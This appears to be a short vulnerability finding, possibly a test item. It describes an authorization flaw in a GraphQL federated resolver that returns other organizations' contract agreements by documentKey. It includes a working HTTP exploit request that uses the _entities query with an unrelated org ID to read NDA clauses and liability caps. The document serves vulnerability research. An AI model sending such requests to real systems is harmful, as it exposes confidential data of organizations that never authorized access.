diagnosis: The ContractAgreement federated entity resolver fetches legal agreements by documentKey without verifying whether the requesting client's organization (x-org-id in context) is an authorized signing party. An attacker can inspect confidential NDAs, contract clauses, and liability caps of other enterprises by providing known or brute-forced document keys.
exploit_request:
POST /subgraph/legal HTTP/1.1
Host: contracts.enterprise.internal:8081
Content-Type: application/json
X-Org-Id: org_unrelated_551

{"query": "query { _entities(representations: [{ __typename: \"ContractAgreement\", documentKey: \"doc_nda_corp_7719\" }]) { ... on ContractAgreement { title counterpartyName liabilityCapUsd ndaClauseText status } } }"}
